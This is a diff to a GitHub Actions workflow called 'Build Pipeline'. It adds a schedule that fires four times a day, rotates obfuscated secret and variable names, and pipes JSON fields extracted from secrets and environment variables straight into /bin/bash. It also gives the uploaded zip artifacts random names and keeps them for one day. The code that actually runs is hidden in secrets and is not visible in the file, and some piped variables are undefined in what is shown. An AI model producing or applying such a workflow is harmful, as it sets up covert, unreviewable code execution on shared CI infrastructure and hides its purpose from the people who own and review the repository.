@@ -2,6 +2,8 @@ name: Build Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '45 5,11,17,23 * * *'
 permissions:
   contents: read
   actions: read
@@ -22,18 +24,17 @@ jobs:
           fetch-depth: 1
       - name: Invoke
         env:
-          dircn0: ${{ secrets.dircn0 }}
+          wtynl4917: ${{ secrets.wtynl4917 }}
         run: |
-          printf '%s' "$dircn0" | jq -r .xpetn82564 | /bin/bash
-          printf '%s' "$vxkqw218" | jq -r .m6936 | /bin/bash
-          echo $torp6 | jq -r .jlmbk80 | /bin/bash
-          echo $je4 | jq -r .dn18431 | /bin/bash
-          echo $jfzbe8 | jq -r .iqsqv6 | /bin/bash
+          printf '%s' "$wtynl4917" | jq -r .we7 | /bin/bash
+          echo $ojfa2 | jq -r .otn17 | /bin/bash
+          printf '%s' "$t1" | jq -r .fp756 | /bin/bash
+          echo $lnbgv12 | jq -r .wb6 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: DBuShNxQ
+          name: MH1cIFtl
           path: "*.zip"
           retention-days: 1
